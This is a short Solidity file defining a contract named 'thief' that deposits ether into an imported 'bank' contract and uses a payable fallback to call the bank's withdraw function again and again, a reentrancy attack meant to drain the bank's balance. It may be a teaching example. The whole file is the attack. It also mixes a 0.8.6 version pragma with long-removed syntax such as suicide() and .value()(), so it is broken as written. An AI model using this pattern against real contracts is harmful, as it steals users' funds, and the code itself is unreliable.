pragma solidity ^0.8.6;

import "./bank.sol";

contract thief {
    bank public Bank;

function thief (address _Bank) {
    Bank = bank(_Bank);
}

function kill () {
    suicide(msg.sender);
}

function collect() payable {
    Bank.put.value(msg.value)();
    Bank.get();
}

function () payable {
    if (Bank.balance >= msg.value) {
        Bank.get();
    }
}




}

